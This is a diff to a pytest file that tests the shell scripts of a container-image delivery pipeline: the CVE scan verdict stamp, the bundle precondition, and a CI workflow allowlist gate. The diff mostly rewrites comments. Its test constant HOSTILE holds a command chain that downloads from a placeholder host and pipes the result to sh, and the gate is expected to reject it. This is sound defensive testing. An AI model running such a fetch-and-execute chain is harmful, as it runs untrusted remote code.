@@ -13,10 +13,10 @@ asserts what the script *did*. The two helpers are deliberately not specific to
 executes an arbitrary bash snippet there -- `_run(tree, "bash scripts/bundle.sh")`
 is as valid as sourcing the library and calling one function.
 
-Copying rather than running in place is not decoration: `REPO` (`lib.sh:24-25`)
-is derived from `BASH_SOURCE` and `readonly`, so relocating `lib.sh` is the only
+Copying rather than running in place is not decoration: `REPO` (`lib.sh`) is
+derived from `BASH_SOURCE` and `readonly`, so relocating `lib.sh` is the only
 way to point the helpers that read `$REPO/Containerfile` at a Containerfile a
-test controls. It is also what makes `_fake_tools` safe. `lib.sh:31` prepends
+test controls. It is also what makes `_fake_tools` safe. `lib.sh` prepends
 `$REPO/.tools/bin` to `PATH`, so the fakes need no PATH manipulation from the
 test side -- but a checkout's own `.tools/bin` can be a symlink to a real
 toolchain, and writing a fake `trivy` through one destroys it. Every directory
@@ -30,7 +30,7 @@ life of the script, and `bundle.sh` would assemble a delivery for an image the
 CVE gate had just rejected.
 
 No `conftest.gate()`. `bash` is not an optional dependency -- `test_image.py` and
-`test_seed_iso.py` already shell out -- and `test_gates.py:29`'s `KNOWN` is a
+`test_seed_iso.py` already shell out -- and `test_gates.py`'s `KNOWN` is a
 closed set of five names, so a gate here would be a skip nothing could ever
 demand. Unconditional is what gives these teeth.
 """
@@ -63,8 +63,9 @@ BASELINE_IDS = [f"CVE-2026-{n:05d}" for n in range(100)]
 
 #: The revision label inside the fake docker-archive, and so the tail of the
 #: bundle's own filename. Deliberately not the fixture repo's HEAD: the archive
-#: being older than the tree is the case `bundle.sh:84-91` warns about and does
-#: not refuse, and the passing test below asserts it is still only a warning.
+#: being older than the tree is the case `bundle.sh`'s revision check warns
+#: about and does not refuse, and the passing test below asserts it is still
+#: only a warning.
 ARCHIVE_REVISION = "b" * 40
 
 #: One fake scanner. `-o PATH` is podman, `--output PATH` is trivy, and
@@ -101,7 +102,7 @@ def _report(tree: Path, found: list[str]) -> None:
 def _fake_tools(tree: Path, found: list[str]) -> None:
     """podman, trivy and syft in the tree's own `.tools/bin`, reporting `found`.
 
-    `lib.sh:31` puts that directory first on `PATH`, so this is the script's own
+    `lib.sh` puts that directory first on `PATH`, so this is the script's own
     injection point and the test manipulates nothing. The archive is a stub:
     nothing in `image-scan.sh` reads it, only the two scanners it hands it to.
     """
@@ -119,20 +120,20 @@ def _fake_tools(tree: Path, found: list[str]) -> None:
 
 
 def _baseline(tree: Path, ids: list[str] = BASELINE_IDS) -> None:
-    """`docs/cve-baseline.json` as `image-scan.sh:128-132` reads it: `.accepted`
-    and nothing else."""
+    """`docs/cve-baseline.json` as `image-scan.sh`'s `delta` jq reads it:
+    `.accepted` and nothing else."""
     (tree / "docs").mkdir()
     (tree / "docs" / "cve-baseline.json").write_text(json.dumps({"accepted": ids}))
 
 
 def _stamp_line(archive: Path) -> str:
     """`sha256sum image.tar` output, which is the whole format of the PASSED
-    stamp `image-scan.sh:187` writes and `bundle.sh:77` checks."""
+    stamp `image-scan.sh` writes and `bundle.sh` refuses to bundle without."""
     return f"{hashlib.sha256(archive.read_bytes()).hexdigest()}  image.tar\n"
 
 
 def _fake_archive(path: Path, revision: str) -> None:
-    """A docker-archive as `archive_label` (`bundle.sh:32-39`) reads one.
+    """A docker-archive as `archive_label` (`bundle.sh`) reads one.
 
     Two JSON members in a tar: `manifest.json` naming the config blob, and the
     blob carrying the two OCI labels the bundle is named from. Nothing in
@@ -159,7 +160,7 @@ def _bundle_tree(tmp_path: Path, stamp: str | None) -> Path:
     """A tree `bundle.sh` runs to completion in, `stamp` becoming `.cache/scan/PASSED`.
 
     `None` writes no stamp at all. Past the precondition the script reaches
-    `source_revision` (`lib.sh:136`), which parses the module's `main.tf` for the
+    `source_revision` (`lib.sh`), which parses the module's `main.tf` for the
     pinned provider version and calls `git rev-parse HEAD`; neither is what these
     tests are about, and both stand between the precondition and the delivery.
     """
@@ -187,7 +188,7 @@ def _run(tree: Path, script: str, **env: str) -> subprocess.CompletedProcess:
     Every `VCOWS_*` variable is dropped from the child environment and put back
     only if a test asks for it. The tree is the fixture, and an ambient override
     must not decide the outcome: `image_tag` returns `$VCOWS_IMAGE_TAG` verbatim
-    when it is set (`lib.sh:103`), so under `just test-image` -- which exports
+    when it is set (`lib.sh`), so under `just test-image` -- which exports
     `VCOWS_IMAGE` and `VCOWS_GATES` into pytest, and is normally invoked with
     `VCOWS_IMAGE_TAG=` on the command line -- both tests below failed while the
     same two passed under `just test`. Measured, not anticipated.
@@ -206,10 +207,11 @@ def _run(tree: Path, script: str, **env: str) -> subprocess.CompletedProcess:
 def test_a_guard_two_levels_inside_a_substitution_stops_the_caller(tmp_path):
     """`image_tag` -> `containerfile_arg` -> `die`, called as `x="$(image_tag)"`.
 
-    That is the shape of `image-build.sh:23`, `image-scan.sh:70` and
-    `test-image.sh:14`, and of `install-tools.sh:115` -> `fetch` -> `digest`.
-    Without `shopt -s inherit_errexit` (`lib.sh:21`) the `die` exits only the
-    innermost subshell, `image_tag` returns `localhost/vcows-deploy:` at status
+    That is the shape of `image-build.sh`, `image-scan.sh` and `test-image.sh`,
+    each assigning `image_tag` inside a substitution, and of
+    `install-tools.sh`'s `fetch` -> `digest`. Without
+    `shopt -s inherit_errexit` (`lib.sh`) the `die` exits only the innermost
+    subshell, `image_tag` returns `localhost/vcows-deploy:` at status
     0, and the builder is invoked with an empty tag.
     """
     tree = _tree(tmp_path, containerfile="FROM scratch\nARG VCOWS_VERSION=\n")
@@ -236,11 +238,12 @@ GONE_ROWS = [(1, False), (33, False), (34, True), (45, True), (56, True)]
 
 @pytest.mark.parametrize(("gone", "red"), GONE_ROWS)
 def test_a_scan_missing_a_third_of_the_baseline_is_not_clean(tmp_path, gone, red):
-    """`image-scan.sh:169` on a 100-id baseline, at five points of the curve.
+    """`image-scan.sh`'s missing-ids guard on a 100-id baseline, at five points
+    of the curve.
 
     The guard tested `missing -eq accepted`, so it fired only at a total loss --
-    a case `scan_floor` (`:56-64`) already refuses. The two losses it exists to
-    catch are partial and large, because trivy's three `Results` split into two
+    a case `scan_floor` already refuses. The two losses it exists to catch are
+    partial and large, because trivy's three `Results` split into two
     disjoint analyser families: 55 ids on the rocky layer and 44 across the two
     Go binaries. `gone=45` is the row that decides the threshold. The remedy both
     review documents prescribe, `missing * 2 -gt accepted`, first fires at 51 and
@@ -261,7 +264,8 @@ def test_a_scan_missing_a_third_of_the_baseline_is_not_clean(tmp_path, gone, red
 
 
 def test_the_scan_stamps_a_pass_and_takes_the_stamp_back_on_a_failure(tmp_path):
-    """`image-scan.sh:89` and `:187`, the two halves of the verdict.
+    """`image-scan.sh`'s `rm -f "$out/PASSED"` and the `sha256sum` that writes it,
+    the two halves of the verdict.
 
     The exit status is the only place the scan used to record whether it
     accepted the image, and an exit status does not survive the process. Both
@@ -287,9 +291,9 @@ def test_bundle_refuses_an_archive_no_scan_has_accepted(tmp_path):
     """The defect: three complete files and no verdict was enough to ship.
 
     A scan that dies on a new finding writes the archive, the report and the SBOM
-    before it reads the baseline, so `bundle.sh:50-52` saw exactly what a passing
-    scan leaves and assembled a correctly named, checksum-verifying delivery for
-    an image the CVE gate had rejected.
+    before it reads the baseline, so `bundle.sh`'s three-file precondition saw
+    exactly what a passing scan leaves and assembled a correctly named,
+    checksum-verifying delivery for an image the CVE gate had rejected.
     """
     tree = _bundle_tree(tmp_path, stamp=None)
     done = _run(tree, "bash scripts/bundle.sh")
@@ -318,9 +322,9 @@ def test_bundle_proceeds_when_the_stamp_matches(tmp_path):
     worse than none.
 
     Also pins the severity split. The archive's revision is not the fixture's
-    HEAD, so `bundle.sh:84-91` fires -- and must stay a warning, because
-    delivering an older image on purpose is legitimate where shipping an
-    unaccepted one is not.
+    HEAD, so `bundle.sh`'s revision warning fires -- and must stay a warning,
+    because delivering an older image on purpose is legitimate where shipping
+    an unaccepted one is not.
     """
     tree = _bundle_tree(tmp_path, stamp=None)
     scan = tree / ".cache" / "scan"
@@ -346,19 +350,20 @@ def test_bundle_proceeds_when_the_stamp_matches(tmp_path):
 # diagnostic -- the shape all four `.gitlab-ci.yml` jobs use. The gate was blind
 # to hostile content in every anchored job and said nothing.
 #
-# It has been covered by nothing since. `docs/review-workflow-gate/REVIEW.md:262`
-# and `:296` record the test being offered twice and declined as surface, with
-# the consequence written down instead: "a future edit to `lines()` has no
+# It has been covered by nothing since. `docs/review-workflow-gate/REVIEW.md`
+# records the test being offered twice and declined as surface, with the
+# consequence written down instead: "a future edit to `lines()` has no
 # automated guard". This is that guard.
 
-#: A command the allowlist at `lint.sh:54` must reject. Written as a chain
-#: because that is the case `lint.sh:49-53` gives for `fullmatch` over `match`:
+#: A command `lint.sh`'s `ok` allowlist must reject. Written as a chain because
+#: that is the case its "the whole command, not its prefix" comment gives for
+#: `fullmatch` over `match`:
 #: a prefix test passes `just check && curl evil.sh | sh`.
 HOSTILE = "just check && curl evil.sh | sh"
 
 #: The gate's own line in `lint.sh`'s summary. It accumulates rather than
-#: &&-chains (`lint.sh:7-11`), so this line is present whatever the other five
-#: gates did.
+#: &&-chains (`lint.sh`'s header), so this line is present whatever the other
+#: five gates did.
 VERDICT = "workflows carry no logic"
 
 
@@ -370,9 +375,10 @@ def _workflow_tree(tmp_path: Path, *, github: dict[str, str], gitlab: str = "") 
     relocating the script is the only way to point the gate at workflows a test
     controls.
 
-    `.venv` is a symlink rather than a build. `lint.sh:128` calls `need_venv`
-    and the gate's body runs under `$PY` (`lib.sh:39`), which needs PyYAML;
-    creating a second venv per test would cost more than the whole file. The
+    `.venv` is a symlink rather than a build. `lint.sh`'s `main` calls
+    `need_venv` and the gate's body runs under `$PY` (`lib.sh`), which needs
+    PyYAML; creating a second venv per test would cost more than the whole
+    file. The
     link is read, never written -- every path these tests write is under
     `tmp_path`.
     """
@@ -452,7 +458,7 @@ GATE_ROWS = [
 def test_the_workflow_gate_reaches_every_shape_a_command_can_take(
     tmp_path, github, gitlab, must_pass
 ):
-    """`lint.sh:40-124` against one hostile command written nine ways.
+    """`workflows_carry_no_logic` against one hostile command written nine ways.
 
     The failing rows assert the diagnostic *names* the command as well. A gate
     that fails without saying which line it objected to is the half of `#82`
